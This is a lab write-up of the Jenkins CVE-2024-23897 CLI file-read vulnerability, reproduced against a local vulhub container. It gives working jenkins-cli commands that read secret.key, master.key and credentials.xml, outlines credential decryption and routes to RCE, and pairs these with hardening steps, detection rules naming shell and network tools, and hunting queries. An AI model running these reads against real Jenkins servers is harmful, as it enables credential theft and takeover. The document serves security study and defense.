# Lab Writeup: Jenkins CLI `expandAtFiles` Arbitrary File Read → RCE (CVE-2024-23897)

> **Environment**: Local Docker lab (vulhub/jenkins/CVE-2024-23897)
> **Purpose**: Security research & exploit-development practice
> **Status**: 🚧 In progress — exploitation done, fill in your own verification + Defense
> **Date**: 2026-05-_TBD_

---

## Overview

Jenkins pre-2.441 (and LTS pre-2.426.3) parses CLI command arguments with [args4j](https://github.com/kohsuke/args4j). The library has an `expandAtFiles` feature where any token starting with `@` is interpreted as a file path whose contents replace the token. Because the CLI is reachable **anonymously** over both HTTP (`/cli`) and Websocket, an attacker can read arbitrary files from the Jenkins controller — typically just the first line per request via an error message, full content via the longer `-webSocket` path. From there, leaking `secret.key` and `master.key` enables decryption of stored credentials, which usually contains SSH keys or admin tokens for full RCE.

| Item | Detail |
|------|--------|
| CVE | CVE-2024-23897 |
| CVSS | 9.8 (Critical) — chain to RCE typical |
| Type | Arbitrary file read via CLI option parser |
| Affected | Jenkins < 2.441 (weekly); Jenkins LTS < 2.426.3 |
| Library | args4j ≤ 2.33 (`expandAtFiles` enabled by default) |
| Default port | 8080/tcp (HTTP) |
| Default creds (vulhub lab) | `admin / vulhub` |

---

## Attack Chain

```
Anonymous CLI (HTTP /cli) → args4j @filename expansion
  → read /var/jenkins_home/secret.key + master.key
  → decrypt credentials.xml → SSH private key / API token → RCE
```

---

## Step-by-Step Reproduction

### 1. Environment Setup

```bash
cd ~/Security/tools/vulhub/jenkins/CVE-2024-23897
docker compose up -d
# Web UI:  http://127.0.0.1:8080   (admin / vulhub)
# Wait ~30s for Jenkins to fully initialize before exploitation.
```

### 2. Fingerprinting

```bash
curl -sI http://127.0.0.1:8080/ | grep -iE "x-jenkins|server"
# Expected: X-Jenkins: 2.441 (or earlier vulnerable version)
```

### 3. Fetch the CLI client

```bash
wget http://127.0.0.1:8080/jnlpJars/jenkins-cli.jar -O jenkins-cli.jar
```

### 4. Arbitrary File Read — first-line via error message

```bash
# Read JENKINS_HOME path
java -jar jenkins-cli.jar -s http://127.0.0.1:8080/ -http help 1 "@/proc/self/environ"

# Once you have JENKINS_HOME (typically /var/jenkins_home), grab encryption material:
java -jar jenkins-cli.jar -s http://127.0.0.1:8080/ -http help 1 "@/var/jenkins_home/secret.key"
java -jar jenkins-cli.jar -s http://127.0.0.1:8080/ -http help 1 "@/var/jenkins_home/secrets/master.key"
```

Only the *first line* of the file appears in the error message via `-http`. For multi-line files use the websocket transport:

```bash
java -jar jenkins-cli.jar -s http://127.0.0.1:8080/ -webSocket help "@/var/jenkins_home/credentials.xml"
```

### 5. Decrypt credentials.xml

```python
# TODO: paste your decryption code here, sketch:
# - read master.key (UTF-8 hex)
# - read secret.key (raw bytes, AES key derived via SHA-256(master.key)[:16])
# - decrypt each <password>{AES-encrypted}</password> blob in credentials.xml
```

Reference: [`jenkins-decrypt`](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py).

### 6. Chain to RCE

Depending on what is stored:
- **SSH private key** → `ssh -i extracted_key user@target`
- **GitHub PAT / cloud API key** → pivot to that service's RCE primitive
- **Admin user API token** → POST a malicious Groovy script to `/script` (the standard Jenkins "script console" RCE)

```bash
# TODO: paste your chosen chain end-to-end here, including the verification command output.
```

### 7. Verification

```bash
# TODO: e.g. docker exec jenkins cat /tmp/<marker>
#       id, hostname, or reverse-shell connection captured.
```

---

## Lessons Learned

<!-- TODO: fill in as you reproduce. Likely traps to watch for: -->

| Issue | Root Cause | Solution |
|-------|-----------|----------|
| `help 1 "@file"` returns nothing | command needs a placeholder arg before `@` | always supply some dummy arg (`help 1`, `who-am-i`, etc.) — args4j only expands non-first tokens |
| Binary files print garbage | encoding mismatch in error stream | use `-webSocket` or read the file in chunks via the `connect-node` command |
| `master.key` looks like a hex string, not a key | it *is* hex; AES key = `SHA256(unhexlify(master.key))[:16]` | follow the documented derivation |
| credentials.xml empty | lab Jenkins has no stored creds yet | log in as `admin/vulhub`, add a dummy SSH cred via UI, then re-read |

---

## Defense

Jenkins is a high-value target — controllers usually hold SSH keys, cloud tokens, and deployment privileges that turn a read primitive into fleet compromise. Defense mirrors that risk profile.

### Hardening — reduce the attack surface

1. **Patch to Jenkins ≥ 2.442 / LTS ≥ 2.426.3** — the fix disables `expandAtFiles` in the CLI entirely.
2. **Disable the CLI** if you do not use it: in `JENKINS_HOME/jenkins.cli.JenkinsCLI.xml` set `<enabled>false</enabled>`, or block `/cli` and `/cli/ws` at the reverse proxy.
3. **Require authentication for read access** — enable "Anyone can do anything" replacement: in `Manage Jenkins → Security` choose *Matrix-based security* and remove anonymous `Overall/Read`.
4. **Rotate `secret.key` + all stored credentials** after any unauthenticated period — even patched Jenkins instances should rotate if they ever ran a vulnerable version on a network that could reach them.
5. **Put Jenkins behind a private network** with an authenticated reverse proxy (Cloudflare Access, oauth2-proxy, mTLS). Public Jenkins is the highest-EV target on the modern internet.
6. **Run agents as non-root, in ephemeral containers** so a controller compromise does not propagate to long-lived hosts.

### Detection — spot the exploit in flight

1. **Access log signature** — exploitation traffic looks like POST requests to `/cli` with `Session` and `Side: download` headers, body containing `@/` paths. Sample regex for an ELK detection:
   ```
   url.path:"/cli" AND http.request.body.content:/.*[@]\/.*/
   ```
2. **Anonymous CLI calls**: if your Jenkins has authentication, anyone hitting `/cli` without auth is an exploit attempt. Alert on `auth=anonymous AND url.path STARTS_WITH "/cli"`.
3. **Error-rate burst on `IllegalArgumentException` / `IOException`** in Jenkins logs (file read fails are noisy). Threshold ≈ 10/min from one source.
4. **Process behaviour on the controller**: a Jenkins JVM spawning `bash`/`sh` with `curl`, `wget`, or `nc` is exploit-grade.
   ```yaml
   - rule: Jenkins controller spawns shell
     condition: spawned_process and proc.pname=java and proc.cmdline contains "jenkins" and proc.name in (bash, sh, nc, curl, wget)
     priority: CRITICAL
   ```
5. **Outbound to GitHub/AWS/GCP from unusual IPs** after CLI activity — exploited creds typically pivot to those services within minutes.

### Threat Hunting — find the breach after the fact

1. **Web access log**: `awk '$7 ~ "^/cli" && $9 == 200 {print}' access.log | less` — every request that returned 200 from `/cli` in the unpatched period.
2. **Audit-log review**: `JENKINS_HOME/logs/all.audit.log` (if [Audit Trail plugin](https://plugins.jenkins.io/audit-trail/) is installed). Look for anonymous CLI command invocations.
3. **Credential rotation forensics**: list every credential in `Manage Jenkins → Credentials` and verify last-used timestamps; rotate anything that *could* have been read.
4. **File-system IOCs on controller**: `find /var/jenkins_home -newer /var/jenkins_home/secret.key -type f` — newly created config or plugin files post-exploit are persistence candidates.
5. **Connected agents**: any unexpected agent connection in `Manage Jenkins → Nodes` from an IP you do not own is a pivot beachhead.
6. **External signals**: search GitHub / GitLab for commits using your Jenkins-stored SSH keys, AWS for IAM key usage from unfamiliar source IPs — the credential leak is usually visible downstream before in-Jenkins evidence surfaces.

---

## Tools & References

- [vulhub/jenkins/CVE-2024-23897](https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897)
- [Jenkins security advisory 2024-01-24 (SECURITY-3314)](https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314)
- [SonarSource — original vulnerability research](https://www.sonarsource.com/blog/excessive-expansion-uncovering-critical-security-vulnerabilities-in-jenkins/)
- [`jenkins-decrypt`](https://github.com/gquere/pwn_jenkins) — offline credential decryption
- [`jenkins-cli-exploit`](https://github.com/h4x0r-dz/CVE-2024-23897) — multi-line read via websocket
- [NVD: CVE-2024-23897](https://nvd.nist.gov/vuln/detail/CVE-2024-23897)

---

## Disclaimer

This writeup documents authorized security research conducted in an isolated local Docker environment. No production systems were targeted. The purpose is educational — understanding attack techniques to build better defenses.
